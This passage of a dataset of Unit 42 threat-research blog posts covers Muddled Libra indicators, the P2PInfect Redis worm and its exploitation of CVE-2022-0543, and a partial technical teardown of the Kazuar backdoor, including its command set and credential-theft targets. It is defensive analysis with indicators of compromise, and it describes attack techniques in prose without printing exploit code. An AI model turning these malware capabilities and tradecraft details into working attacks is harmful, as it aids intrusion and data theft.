Firewall (NGFW) configured with machine learning enabled and best-in-class, cloud-delivered security services.\nThis includes, for example, threat prevention, URL filtering, DNS security and a malware prevention engine capable of identifying and blocking malicious samples and infrastructure. -\nEndpoint security: delivered through an XDR solution that can identify malicious code through advanced machine learning and behavioral analytics.\nThis solution should be configured to act on and block threats in real-time as they are identified. -\nSecurity automation: delivered through an XSOAR or XSIAM solution capable of providing SOC analysts with a comprehensive understanding of the threat derived by stitching together data from endpoints, network, cloud and identity systems.\nIf you think you might have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Indicators of Compromise IPs observed during this activity: - 104.247.82[.]11 - 105.101.56[.]49 - 105.158.12[.]236 - 134.209.48[.]68 - 137.220.61[.]53 - 138.68.27[.]0 - 146.190.44[.]66 - 149.28.125[.]96 - 157.245.4[.]113 - 159.223.208[.]47 - 159.223.238[.]0 - 162.19.135[.]215 - 164.92.234[.]104 - 165.22.201[.]77 - 167.99.221[.]10 - 172.96.11[.]245 - 185.56.80[.]28 - 188.166.92[.]55 - 193.149.129[.]177 - 207.148.0[.]54 - 213.226.123[.]104 - 35.175.153[.]217 - 45.156.85[.]140 - 45.32.221[.]250 - 64.227.30[.]114 - 79.137.196[.]160 - 92.99.114[.]231 Additional Resources - Muddled Libra Discussion With Unit 42 Senior Consultant Stephanie Regan – Threat Vector Podcast, Unit 42 on CyberWire Daily - Exposing Muddled Libra's Meticulous Tactics With Unit 42 Senior Researcher Kristopher Russo – Threat Vector Podcast, Unit 42 on CyberWire Daily - Muddled Libra's Evolution to the Cloud – Unit 42, Palo Alto Networks - Roasting 0ktapus: The phishing campaign going after Okta identity credentials – Group-IB - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies – CrowdStrike - Detecting Scatter Swine: Insights into a Relentless Phishing Campaign – Okta - I Solemnly Swear My Driver Is Up to No Good: Hunting for Attestation Signed Malware – Mandiant - Is Your Browser Extension a Botnet Backdoor? –\nKrebs on Security - Suspicion stalks Genesis Market’s competitors following FBI takedown – The Record, Recorded Future News Updated May 16, at 10:12 a.m. PT to include the evolution of Muddled Libra activity since the beginning for 2024.","num_sentences":195,"metadata":{"source":"blog","platform":"Unit42","filename":"Muddled Libra"}}
{"id":83,"title":"P2PInfect: The Rusty Peer-to-Peer Self-Replicating Worm","publish_date":"2022-03-28","link":"https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/","clean_text":"Executive Summary On July 11, 2023, Unit 42 cloud researchers discovered a new peer-to-peer (P2P) worm we call P2PInfect.\nWritten in Rust, a highly scalable and cloud-friendly programming language, this worm is capable of cross-platform infections and targets Redis, a popular open-source database application that is heavily used within cloud environments.\nRedis instances can be run on both Linux and Windows operating systems.\nUnit 42 researchers have identified over 307,000 unique Redis systems communicating publicly over the last two weeks, of which 934 may be vulnerable to this P2P worm variant.\nWhile not all of the 307,000 Redis instances will be vulnerable, the worm will still target these systems and attempt the compromise.\nThe P2PInfect worm infects vulnerable Redis instances by exploiting the Lua sandbox escape vulnerability, CVE-2022-0543.\nWhile the vulnerability was disclosed in 2022, its scope is not fully known at this point.\nHowever, it is rated in the NIST National Vulnerability Database with a Critical CVSS score of 10.0.\nAdditionally, the fact that P2PInfect exploits Redis servers running on both Linux and Windows operating systems makes it more scalable and potent than other worms.\nThe P2P worm observed by Unit 42 researchers serves as an example of a serious attack threat actors could conduct using this vulnerability.\nP2PInfect exploits CVE-2022-0543 for initial access and then drops an initial payload that establishes P2P communication to a larger P2P network.\nOnce the P2P connection is established, the worm pulls down additional malicious binaries such as OS-specific scripts and scanning software.\nThe infected instance then joins the P2P network to provide access to the other payloads to future compromised Redis instances.\nExploiting CVE-2022-0543 in this way makes the P2PInfect worm more effective at operating and propagating in cloud container environments.\nThis is where Unit 42 researchers discovered the worm by it compromising a Redis container instance within our HoneyCloud environment, which is a set of honeypots that we use to identify and study novel cloud-based attacks across public cloud environments.\nUnit 42 believes this P2PInfect campaign is the first stage of a potentially more capable attack that leverages this robust P2P command and control (C2) network.\nThere are instances of the word “miner” within the malicious toolkit of P2PInfect.\nHowever, researchers did not find any definitive evidence that cryptomining operations ever occurred.\nAdditionally, the P2P network appears to possess multiple C2 features such as “Auto-updating” that would allow the controllers of the P2P network to push new payloads into the network that could alter and enhance the performance of any of the malicious operations.\nUnit 42 researchers will continue to monitor for changes and update accordingly.\nPalo Alto Networks customers receive protections against the types of threats discussed in this article through products including: - Prisma Cloud - Advanced WildFire - Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and Advanced Threat Prevention.\nIf you believe you have been compromised by P2PInfect, the Unit 42 Incident Response team can provide a personalized response.\n| Related Unit 42 Topics | Cloud, Worm, P2P | Self-replicating Peer-to-Peer Worm Unit 42 discovered the first known instance of P2PInfect on July 11, 2023, using our HoneyCloud environment, which is a set of honeypots that we use to identify and study novel cloud-based attacks across public cloud environments.\nThe P2PInfect worm uses a P2P network to support and facilitate the transmission of malicious binaries.\nWe chose the name because the term P2PInfect appears in the leaked symbols reflecting the malware author project structure, as shown in Figure 1.\nAll collected samples of the P2P worm are written in Rust, a highly scalable and cloud-friendly programming language.\nThis allows the worm to be capable of cross-platform infections that target Redis instances on both Linux and Windows operating systems (please note that Redis does not officially support the Windows OS).\nThe worm infects vulnerable Redis instances using the Lua sandbox escape vulnerability, CVE-2022-0543.\nThe first exploit for this particular vulnerability was published in March 2022, which resulted in the connection of the infected Redis instance to the Muhstik botnet.\nHowever, the P2PInfect worm appears to be associated with a different malicious network, not known to be related to the Muhstik botnet.\nAfter initial infection through the exploitation of the Lua vulnerability, an initial payload is executed that establishes a P2P communication to the larger C2 botnet, which serves as a P2P network for delivering other payloads to future compromised Redis instances.\nOnce the P2P connection is established, the worm pulls down additional payloads, such as a scanner.\nThe newly infected instance then joins the ranks of the P2P network to provide scanning payloads to future compromised Redis instances.\nExploiting CVE-2022-0543 makes P2PInfect effective in cloud container environments.\nContainers have a reduced set of functionalities – for example, they do not have “cron” services.\nMany of the most active worms exploiting Redis use a technique to achieve remote code execution (RCE) using cron services.\nThis technique does not work in containers.\nP2PInfect incorporates the exploit for CVE-2022-0543 with the intention of covering as many vulnerable scenarios as possible, including cloud container environments.\nThe following sections will cover details about the exploitation payloads, the behavior of P2PInfect, and some of the details of the P2P network protocol.\nSince the P2PInfect worm is newly discovered, we have focused here on providing an overview of its behavior and the P2P architecture it supports, as well as basic sample analysis.\nHowever, additional analysis and study is warranted in future research.\nExploitation of CVE-2022-0543 P2PInfect currently exploits the Lua sandbox escape vulnerability CVE-2022-0543 for initial access.\nThis vulnerability has been used in previous attacks such as Muhstik and Redigo, both of which resulted in the compromised Redis instances participating in denial-of-service (DoS), flooding and brute-forcing attacks against other systems.\nThis exploit vector follows a similar pattern to what has been seen previously.\nHowever, the post-exploit operations of P2PInfect are significantly different from the previous uses of the vulnerability.\nIt is important to note that this vulnerability is not a Redis application vulnerability — it is specifically a Lua sandbox vulnerability.\nWhile this campaign does target vulnerable Redis instances and perform worm-like operations, there are no known links to other threat actor groups known for targeting Redis and deploying worms, such as Automated Libra (aka PurpleUrchin), Adept Libra (aka TeamTNT), Thief Libra (aka WatchDog), Money Libra (aka Kinsing), Aged Libra (aka Rocke) or Returned Libra (aka 8220).\nHow P2PInfect Leverages CVE-2022-0543 to Infect Vulnerable Redis Instances The P2PInfect worm’s initial infection vector – exploiting Redis through CVE-2022-0543 – is not common among other cryptojacking-focused worms known to target Redis instances, such as those created by Adept Libra (aka TeamTnT), Thief Libra (aka WatchDog) threat actors or the ones delivering Money Libra (aka Kinsing) variants.\nThese groups use alternative Redis vulnerabilities or misconfigurations in order to operate.\nCVE-2022-0543 is a vulnerability with the Lua library related to the way Redis is packaged and delivered by Debian Linux package management.\nAs such, it only affects users of Redis who use the Debian or derived (Ubuntu and others) distributions.\nDue to the focus on the OS and leveraging a subcomponent of Redis to compromise, P2PInfect’s exploitation efforts are therefore complex.\nFigure 2 shows an example of a captured exploit for CVE-2022-0543.\nWithin the above image, one can see how the vulnerability is being weaponized.\nBy using network requests through /dev/tcp, as seen on line four, the threat actor connects to a C2 IP address, written as ip-cnc over port 60100.\nPort 60100 is one of the P2P communication ports used by P2PInfect to maintain C2 communication.\nThe initial payload, also seen on line four, sets the GET request to the directory /linux, which is the main dropper maintaining the core functionality of the P2PInfect worm.\nOther binaries are distributed within the P2P network, as we are going to see later in the article.\nNetwork Communication Behavior P2PInfect uses its P2P network to distribute follow-up malware to newly infected systems or cloud instances.\nWhen a system is first compromised, it will make a network connection to the P2P network and download the samples for the custom protocol to be used.\nAs Figure 3 illustrates, the command: GET /linux, is followed by the image download of the core P2PInfect functionality.\nBoth Linux and Windows OS P2PInfect samples communicate in the same manner.\nThe following samples were downloaded from the P2P network in plaintext: linux, miner, winminer and windows (see Figure 4).\nOnce the core P2PInfect sample finishes execution, the payload will start scanning for additional hosts to compromise.\nThe scanning operation focuses on exposed Redis hosts.\nHowever, researchers also found that compromised Redis instances also perform scanning attempts over port 22, SSH.\nWhile it is not clear why this scanning operation is taking place, as there are no known exploitation attempts by P2PInfect to compromise SSH, it is not altogether uncommon for port 22 to be scanned post-compromise by other known worms.\nPlease see the Scanning Behavior section for additional details.\nNode Communications The main dropper communicates with any other listening P2P members on the current list of configured nodes using TLS 1.3.\nThe C2 infrastructure is updated when the compromised node sends a json request with all known nodes to the P2P network.\nUpdates to the C2 infrastructure will automatically be downloaded.\nThe following image, Figure 5, shows an example of the nodes update.\nThe values with x.x.x.x are the current node IP, or the new learned nodes.\nScanning Behavior Figure 6 illustrates the network scanning behavior of an infected host scanning for exposed SSH instances.\nThese scanning operations occur across a random netrange selected by the P2PInfect functionality.\nFigure 7 illustrates the P2PInfect scanning operations for exposed Redis instances.\nOther Observations of P2PInfect Some of the initial payload P2PInfect samples delivered to exploited systems were packed with UPX, while the second-stage malware samples, miner and winminer, were not UPX packed.\nAfter the first dropper runs, it starts decrypting the configuration received from a command line, with information about other nodes in the P2P network.\nWe found that the P2P port was variable – a design choice that allows the attack to be resilient to blocking and network firewall mitigation techniques (see Figure 8).\nAll samples identified by Unit 42 researchers have been written in Rust, and some have “symbols leaked” inside, which gives indicators about the malware authors’ project structure.\nFor example, the windows sample main execution thread leaks the name of the project as well as the file directory usage of the threat actor (see Figure 9).\nWe also identified a PowerShell script designed to establish and maintain communication between the compromised host and the P2P network.\nThe PowerShell script leveraged the encode command to obfuscate the communication initiation (see Figure 10).\nOne of the first operations performed by the PowerShell command is to configure the local system firewall to block legitimate access to or from the compromised Redis application (see line five of Figure 11).\nThen (starting on line 17 in Figure 11), the script opens a communication port for the threat actor to access the compromised instance.\nThis is a form of persistence, allowing the threat actors to maintain access to the infected host and keep it operable.\nOf note from the decoded PowerShell, shown in Figure 11, are the following firewall configuration settings: - Peer-to-peer port is 60102 – this port is variable, as not all nodes use the same port - Redis port 6379 is only allowed to connect known C2 IPs - The firewall rule is named Microsoft Sync The Monitor Process Another interesting feature of the initial P2PInfect payload when running in Windows OS is a process called the Monitor.\nThe Monitor process fulfills the role of maintaining the functionality of the P2PInfect running processes on the infected host.\nThe Monitor is dumped to C:\\Users\\username\\AppData\\Local\\Temp\\cmd.exe (see Figure 12 for an example of the Monitor (cmd.exe) enumerating system running processes).\nAfter launching the Monitor (cmd.exe), the initial P2PInfect payload downloads new versions of itself from the P2P network and persists them with random names into the same original folder and an encrypted configuration is dropped (.conf) (see Figure 13).\nThe new P2PInfect download versions are executed, and the scanning operations to locate additional vulnerable Redis instances starts.\nThe initial P2PInfect dropper will attempt to delete itself (see Figure 14).\nConclusion The P2PInfect worm appears to be well designed with several modern development choices.\nKey among these is the use of the Rust language, which provides resilient capabilities and the flexibility to allow the worm to rapidly spread across multiple operating systems.\nThe design and building of a P2P network to perform the auto-propagation of malware is not something commonly seen within the cloud targeting or cryptojacking threat landscape.\nAt the same time, we believe it was purpose-built to compromise and support as many Redis vulnerable instances as possible across multiple platforms.\nWe have caught several samples within our HoneyCloud platform, across multiple geographic regions, and we strongly believe the number of P2P nodes is growing.\nThis is due to the volume of potential targets – over 307,000 Redis instances communicating publicly over the last two weeks – and since the worm was able to compromise multiple of our Redis honeypots across disparate regions.\nHowever, we don't have an estimate yet of how many nodes exist or how fast the malicious network associated with P2PInfect is growing.\nWe recommend that organizations monitor all Redis applications, both on-premises and within cloud environments, to ensure they do not contain random filenames within the /tmp directory.\nAdditionally, DevOps personnel should continually monitor their Redis instances to ensure they maintain legitimate operations and maintain network access.\nAll Redis instances should also be updated to their latest versions or anything newer than redis/5:6.0.16-1+deb11u2, redis/5:5.0.14-1+deb10u2, redis/5:6.0.16-2 and redis/5:7.0~rc2-2.\nPalo Alto Networks customers receive protections against the types of threats in the following ways: - Prisma Cloud is capable of identifying the runtime environment of any cloud Redis instance to ensure it detects and prevents the unknown and malicious execution of the P2PInfect worm. -\nCloud-Delivered Security Services for the Next-Generation Firewall include a variety of protections. -\nAdvanced URL Filtering blocks malicious IoCs related to this worm. -\nAdvanced Threat Prevention can block the attacks with Best Practices via Threat Prevention signatures 92349 and 93004. -\nThe Advanced WildFire cloud-delivered malware analysis service accurately identifies known samples as malicious.\nIf you think you might have been impacted or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise SHA256 Samples Linux: - 88601359222a47671ea6f010a670a35347214d8592bceaf9d2e8d1b303fe26d7 Miner: - b1fab9d92a29ca7e8c0b0c4c45f759adf69b7387da9aebb1d1e90ea9ab7de76c Windows: - 68eaccf15a96fdc9a4961daffec5e42878b5924c3c72d6e7d7a9b143ba2bbfa9 WinMiner: - 89be7d1d2526c22f127c9351c0b9eafccd811e617939e029b757db66dadc8f93 IPs - 35.183.81[.]182 - 66.154.127[.]38 - 66.154.127[.]39 - 8.218.44[.]75 - 97.107.96[.]14 CNC Requests - GET /linux - GET /linux_sign - GET /miner - GET /miner_sigg - GET /winminer - GET /winminer_sign - GET /windows_sign - GET /windows Updated July 20, 2023, at 1:08 p.m. PT.","num_sentences":111,"metadata":{"source":"blog","platform":"Unit42","filename":"P2PInfect"}}
{"id":84,"title":"Over the Kazuar’s Nest: Cracking Down on a Freshly Hatched Backdoor Used by Pensive Ursa (Aka Turla)","publish_date":"2023-07-28","link":"https://unit42.paloaltonetworks.com/pensive-ursa-uses-upgraded-kazuar-backdoor/","clean_text":"Executive Summary While tracking the evolution of Pensive Ursa (aka Turla, Uroburos), Unit 42 researchers came across a new, upgraded variant of Kazuar.\nNot only is Kazuar another name for the enormous and dangerous cassowary bird, Kazuar is an advanced and stealthy .NET backdoor that Pensive Ursa usually uses as a second stage payload.\nPensive Ursa is a Russian-based threat group operating since at least 2004, which is linked to the Russian Federal Security Service (FSB).\nThe Ukrainian CERT reported in July 2023 that this version of Kazuar was targeting the Ukrainian defense sector.\nThe threat group behind this variant was going after sensitive assets such as those found in Signal messages, source control and cloud platforms data.\nSince Unit 42’s discovery of Kazuar in 2017, we have seen it in the wild only a handful of times, targeting mostly organizations in the European government and military sectors.\nThe Sunburst backdoor has been tied to Kazuar by code resemblance, which demonstrates its complexity level.\nSince late 2020, we had not seen new Kazuar samples in the wild – yet reports suggested Kazuar was under constant development.\nAs the code of the upgraded revision of Kazuar reveals, the authors put special emphasis on Kazuar’s ability to operate in stealth, evade detection and thwart analysis efforts.\nThey do so using a variety of advanced anti-analysis techniques and by protecting the malware code with effective encryption and obfuscation practices.\nThis article provides a deep technical analysis of Kazuar’s capabilities.\nWe are sharing this research to provide detection, prevention and hunting recommendations to help organizations strengthen their overall security posture.\nAn additional list of artifacts will be provided in an appendix linked to our GitHub page.\nPalo Alto Networks customers receive protections from and mitigations for the threats mentioned in this article in the following ways: - Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the malware C2 traffic - Organizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others - The Cortex XDR and XSIAM platform detects and prevents the threats mentioned in this article - The Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of this new Kazuar variant.\n| Related Unit 42 Topics | Backdoors, Pensive Ursa | Kazuar Overview Kazuar is known for being an advanced and stealthy .NET backdoor that Pensive Ursa usually uses as a second stage payload, delivered together with other tools that the threat group commonly uses.\nThe recent campaign that the Ukrainian CERT reported unveiled the multi-staged delivery mechanism of Kazuar, together with other tools such as the new Capibar first-stage backdoor.\nOur technical analysis of this recent variant – seen in the wild after years of hiatus – showed significant improvements to its code structure and functionality.\nThis post will detail previously undocumented features, including: - Comprehensive system profiling - Extensive data collection. -\nCredential theft of cloud and other sensitive applications - Theft of cloud application accounts, source control and Signal messaging application. -\nExtended set of commands - A total of 45 supported commands to execute, received from another Kazuar node or the command and control (C2) server. -\nEnhanced task automation - A range of automated tasks that the attacker could turn on/off. -\nVariable encryption schemes - Implementation of different encryption algorithms and schemes. -\nInjection modes - Multiple injection modes, allowing Kazuar to run from different processes and execute different features.\nSince at least 2018, variants of Kazuar changed their obfuscation methods and methodically modified its compilation timestamps.\nSome variants used the ConfuserEx obfuscator to encrypt strings, and others used a custom method.\nIn the Kazuar variant analyzed in this blog, the authors went a step further, implementing multiple custom methods for string encryption.\nUnlike with previous variants, the authors only focused on targeting the Windows operating system.\nClarification note: While analyzing Kazuar’s code, we used dnSpy to export the code into an integrated development environment (IDE) and decrypted the strings using a custom script.\nThis allowed us to edit separate .cs files and edit some of the method names into meaningful ones.\nWe have interpreted the method names that appear in the screenshots.\nLatest Kazuar Variant Detailed Technical Analysis Metadata Reports from other research organizations have shown that the authors of Kazuar have manipulated their samples’ timestamps since at least 2018.\nThis new variant’s compilation timestamp is Thursday, November 20, 2008 10:11:18 AM GMT.\nUnlike other publicly available variants, this is the first time the authors went back as far as 2008 when faking the timestamp.\nKazuar also contains hard-coded, hashed identifiers for the Agent version and BuildID as well as an Agent label.\nThese can be used as variant identifiers, as shown in Figure 1.\nInitialization Executing Assembly Check When executing Kazuar, it uses the Assembly.\nLocation property to receive its own file path and check its name.\nKazuar will continue execution only if the returned value is an empty string, as shown in Figure 2.\nThe Assembly.\nLocation property returns an empty string when loading the file from a byte array.\nThis check appears to be a simple form of an anti-analysis mechanism, to ensure that the execution of the malware was done by the intended loader and not by other means or software.\nKazuar will execute if its filename matches a specific hard-coded hashed name (using the FNV algorithm).\nThis behavior is probably meant for debugging purposes, letting the authors avoid using the loader each time they debug the malware.\nOperational Root Directory Creation Kazuar creates a new directory to store its configuration and log data.\nIt uses %localappdata% as the main storage path and determines its root directory from a list of hard-coded paths (See Appendix).\nKazuar chooses which root directory, folder names, filenames and file extensions to use based on the machine globally unique identifier (GUID), as shown in Figure 3.\nAlthough these names might seem randomly generated at a first glance, the usage of the GUID means they will keep the same name for each execution of the malware on the same infected machine.\nLike in previous variants, Kazuar uses a structured directory scheme to save its log files and other data such as individual configuration files and keylogger data.\nDirectory naming is pseudorandom and chosen based on hashing.\nExamples include the custom implementation of the FNV hashing algorithm seen in previous variants, and other manipulations on the GUID value.\nYou can find a list of the directories in their plaintext names in the Appendix.\nIt is also worth mentioning that there is a currently unreferenced option to create a file called wordlist in the code.\nThis file could give us a clue about a feature not yet implemented, perhaps using a wordlist for directories, filenames or password brute forcing.\nConfiguration Files The malware creates a separate main configuration file that includes data including the following: - C2 servers - Injection mode - Other operational configuration data Figure 4 shows a snippet from this file below.\nYou can find the encryption methods for Kazuar’s configuration files in the Appendix.\nMutex Name Generation Kazuar is using a mutex to check its injection into another process.\nKazuar generates its mutex name by XORing the current process ID with the hard-coded value 0x4ac882d887106b7d and then XORing it with the machine's GUID, as depicted in Figure 5.\nThis means that several Kazuars can operate in tandem on the same device, just not injected into the same process.\nArchitecture Setting Kazuar’s Injection Modes The new version of Kazuar uses what it describes in the configuration as “injection modes” as shown in Table 1.\nThe default mode is inject.\n| Configuration file mode name | Description | Inbound traffic | Outbound traffic | Additional functionality threads | | inject | | Named pipe | Named pipe | | | zombify | | Named pipe | HTTP | | | combined | In case the default inject method fails, it executes via the same method as zombify | N/A | N/A | N/A | | remote | Creates a named pipe communication channel and serves as a proxy for other Kazuar instances, no C2 communication | Named pipe | Named pipe | | | single | | Named pipe or HTTP | Named pipe or HTTP | | | Not in User Interactive Mode | In case Kazuar’s execution is in a user interactive mode, which could occur when executing Kazuar as a service or on a machine with no GUI such as a server.\n| Named pipe | Named pipe | | Table 1.\nKazuar injection modes and descriptions.\nIn zombify mode, Kazuar is injected into the user’s default browser and has a fallback mechanism to inject itself to svchost.exe in case the query for the default browser fails.\nFigure 6 shows that the term zombify addresses process injection in general by Kazuar’s authors.\nMultithreading Model Kazuar operates in a multithreading model, while each of Kazuar’s main functionalities operates as its own thread.\nIn other words, one thread handles receiving commands or tasks from its C2, while a solver thread handles execution of these commands.\nThis multithreading model enables Kazuar’s authors to establish an asynchronous and modular flow control.\nFigure 7 shows the task solver flow.\nThe Task Solver Component - Kazuar’s Puppeteer Kazuar receives new tasks, solves them and writes the output into result files.\nA solver thread is handling new tasks received from the C2 servers or another Kazuar node.\nThe task content is then encrypted and written to disk into a task file.\nEach task file implements a hybrid encryption scheme: - Using RNGCryptoServiceProvider to generate two byte-arrays containing random numbers, which are 16 and 32 bytes long respectively. -\nUsing the first array as an AES (Rijndael) initialization vector (IV). -\nUsing the second array as an AES key. -\nGenerating an HMACMD5 hash based on the result’s content from memory, prior to its encryption and writing to disk, using the array described in the first bullet above as the key. -\nEncrypting the HMACMD5 hash, AES key and IV with the hard-coded RSA key, and writing the encrypted BLOB to the beginning of the file.\nBy using the fast AES algorithm to encrypt larger objects such as the result’s contents, and using the slower RSA encryption to conceal the AES key and IV, Kazuar improves its performance.\nThis also disables the option of recovering infected files only from disk, since the symmetric key is encrypted using an asymmetric key. -\nUsing the AES encryption to encrypt the result file’s contents.\nAs shown in Figure 8, once a task is complete, the generated result file will be saved to disk.\nIn addition to the aforementioned encrypted data, Kazuar writes the following fields to the beginning of the result file: - Four zero bytes (we believe this serves as a sort of a delimiter) - Generated result identifier - Length of the encrypted GUID, using the same XOR algorithm as in the initialization part (the encrypted message here is “System info at [datetime] (-07)”) - The encrypted GUID itself - RSA encrypted HMACMD5 hash + IV + AES key - The AES encrypted task content Figure 9 shows the encrypted result file content from disk.\nStrings Encryption Kazuar’s code includes a high volume of strings that are related to functionality and debugging.\nWhen revealed in plain text, they shed light on the inner workings and functionality of Kazuar.\nTo avoid the scenario of researchers creating strings-based indicative YARA and hunting rules, Kazuar’s strings are encrypted.\nIt decrypts each string at runtime.\nKazuar uses a variation of a Caesar Cipher for the string encryption/decryption algorithm.\nIn this algorithm, Kazuar implements a dictionary that simply swaps the key and value of each member.\nRecent Kazuar variants implemented only one dictionary, while the new variant implements multiple dictionaries, each containing 80 pairs of characters as shown in Figure 10.\nFigure 11 shows a loop iterating over a given string, and checking if the ordinal value of a given character is in the dictionary keys of the relevant class.\nIf it is, Kazuar swaps the key and value and appends it to the crafted string.\nOtherwise, it keeps the original character.\nIn addition to the string obfuscation, the authors have given unmeaningful names to the classes and methods in the code, to make analysis more difficult.\nOne of the strings decoded by Kazuar returns the value “Invalid pong responce” as shown in Figure 12.\nIt seems that one of the malware coders forgot to switch the Russian C for an English S. Core Functionality In a fashion typical to Pensive Ursa, to avoid takedowns, Kazuar uses hijacked legitimate websites for its C2 infrastructure.\nIn addition, as mentioned in the Injection Modes section, Kazuar also supports communication over named pipes.\nIt uses both mechanisms to receive remote commands, or tasks (as described in the code).\nSupported C2 Commands Kazuar supports 45 different tasks it can receive from its C2, as shown in Table 2.\nThis is yet another development in Kazuar’s code, as previous research hadn’t documented some of these tasks.\nBy comparison, Kazuar’s first variant analyzed back in 2017 supported only 26 C2 commands.\nWe have grouped Kazuar’s commands into the following categories: - Host data collection - Extended forensic data collection - File manipulation - Arbitrary command execution - Interaction with Kazuar’s configuration - Registry querying and manipulation - Scripts execution (VBS, PowerShell, JavaScript) - Custom network requests - Credentials and sensitive information stealing | Command | Description | | sindex | Searches for properties of files with the following extensions: .txt, .ini, .config, .vbs, .js, .ps1, .doc, .docx, .xls, .xlsx, .ppt, .pptx under folders in the C:\\Users\\ path.\n| | scrshot | Takes a screenshot of the window of a specified process | | move | Moves a file from a source path to a destination path | | info | Gets system information about one or multiple of the fields (described in Appendix) | | steal | Steals data from various browsers and applications (full list ID in Appendix) | | run | Executes a specified executable with supplied arguments, save the output to a temporary file, and upload the file to the C2 server.\n| | schlist | Gets data about scheduled tasks using the Schedule.\nService COM object | | config | Updates Kazuar’s configuration file | | netuse | Connects or removes network resources from the machine using the WNetAddConnection2 and WNetCancelConnection2 WinAPIs | | log | Adds a custom log to the log file | | delegate | Sends a command to another Kazuar implant on a remote system using a PIPE | | eventlog | Gets Windows Event log entries | | get | Uploads files from a specified directory to Kazuar’s C2 servers, choosing which files to upload based on their modified, accessed and created timestamps.\n| | autoruns | Checks various possibilities for software to have persistence in the infected machine (checks described in Appendix) | | put | Writes received data to a specified file on the system.\n| | regwrite | Sets a registry key/value.\n| | autoslist | Lists the number of files that were created under the Autos functionality | | vbs | Executes a VBScript | | psh | Executes a PowerShell Script | | sleep | Sets Kazuar to sleep for a specified amount of time | | regdelete | Deletes a registry key/value | | timelimit | Sets a time limit for a task from the server | | dlllist | Gets all loaded modules of a specified process | | autosget | Sends files created by the Autos functionality to the C2 | | wmiquery | Executes a WMI Query | | dotnet | Executes a .NET method received from the C2 | | tasklist | Gets a list of running processes | | find | Finds a specified directory and lists its files.\nIt appears the actor can specify which files to list based on their modified, accessed and created timestamps as well.\n| | peep | Executes a command related to the peeps functionality, which we have described in the peeps section.\n| | forensic | Checks the system for multiple forensic artifacts (see Appendix) | | kill | Kills a process by name or by process identifier (PID) | | regquery | Queries a registry key | | chakra | Executes Javascript using ChakraCore | | http | Creates a crafted HTTP request | | pipelist | Gets open pipe list for a specific machine | | jsc | Executes JavaScript | | wmicall | Calls a WMI method | | autosdel | Deletes files created by the Autos functionality | | del | Deletes a specified file OR folder.\nAllows the attacker to supply a flag to securely delete a file by overwriting the file with random data before deleting it.\n| | nbts | Crafts a NetBIOS request | | copy | Copies a specified file to a specified location.\nThe attacker is able to overwrite the destination file if it already exists.\n| | upgrade | Downloads an upgrade to the malware | | cmd | Executes a command via cmd.exe | | unattend | Steals files related to various windows configuration or cloud applications credentials (full list of files is included in Appendix) | | autosclear | Clears the Autos log list of files | Table 2.\nKazuar’s supported C2 commands.\nCloud, Source Control and Messaging Apps Credential Theft Kazuar has the capability to attempt to steal credentials from many artifacts in the infected computer, by receiving the commands steal or unattend from the C2.\nThese artifacts include multiple well-known cloud applications.\nKazuar can attempt to steal sensitive files that contain credentials for these applications.\nArtifacts targeted by Kazuar include Git SCM (a source control system that is popular among developers), as shown in Figure 13, and Signal (an encrypted messaging service for private instant messaging).\nWe have included the full description of the artifacts in the Appendix.\nComprehensive System Profiling When Kazuar is initially spawning a unique solver thread, the first task it automatically executes is the extensive collection and profiling of the targeted system, named by Kazuar’s authors as first_systeminfo_do.\nAs part of this task, Kazuar will collect extensive information about the infected machine and will send it to the C2.\nThis includes information on the operating system, hardware and network.\nThe Appendix includes the entirety of what the attackers collected.\nKazuar saves this data into an info.txt file and saves the execution logs to a logs.txt file.\nAs mentioned in the Task Solver section, we can see the result in memory.\nIn this case, it’s an archive, as depicted in Figure 14.\nBesides the two aforementioned text files, as part of this task, the malware takes a screenshot of the user’s screen.\nFigure 15 shows the zipping of all of these files into one archive before being encrypted and sent to the C2.\nCreating Automated Tasks (Autos) Kazuar has the ability to set up automated tasks that will run at specified intervals to gather information from the infected machines.\nFigure 16 shows an example of this functionality as documented in Kazuar’s configuration.\nThese automated tasks include the following: - Gathering system information (described in the section on Comprehensive System Profiling) - Taking screenshots - Stealing credentials (listed in full in the Appendix) - Getting forensics data (see Appendix) - Getting auto-runs data (see Appendix) - Getting files from specified folders. -\nGetting a list of LNK files - Stealing emails using MAPI Monitoring Active Windows (Peeps) Kazuar has the ability to let attackers set up what they called “peep rules” in the configuration.\nAlthough Kazuar does not come with these rules set out of the box, according to the malware’s code, it appears that this functionality enables the attacker to monitor the windows of specified processes.\nThis allows the attacker to track user activity of interest on the compromised machine.\nCommunication With the Command and Control HTTP Prior to establishing a communication channel with a C2 server, and in addition to the aforementioned anti-analysis checks, Kazuar checks the configuration data-sending time intervals.\nThis check includes determining whether it should send data over the weekend or not.\nUpon first communication, Kazuar sends the collected data (described in the Comprehensive System Profiling section) in an XML format and expects to get an XML structured response back with a new task.\nFigure 17 shows the HTTP request.\nKazuar uses a hard-coded value 169739e7-2112-9514-6a61-d300c0fef02d casted to a string and Base64 encoded as the cookie.\nKazuar generates key names for the XML and Base64 encrypts the content prior to sending it to the C2.\nThe content of the XML contains: - Encrypted content of the result file - Result identifier - Pseudorandom 4-byte numbers, probably another type of identifier - An array with values pseudorandomly generated based on the machine’s GUID - The hard-coded GUID connection string 169739e7-2112-9514-6a61-d300c0fef02d - The machine’s unique GUID Communication Using Named Pipes In addition to direct HTTP communication with the C2, Kazuar has the ability to function as a proxy, to receive and send commands to other Kazuar agents in the infected network.\nIt is doing this proxy communication via named pipes, generating their names based on the machine’s GUID.\nKazuar uses these pipes to establish peer-to-peer communication between different Kazuar instances, configuring each as a server or a client.\nThe named pipe communication supports the 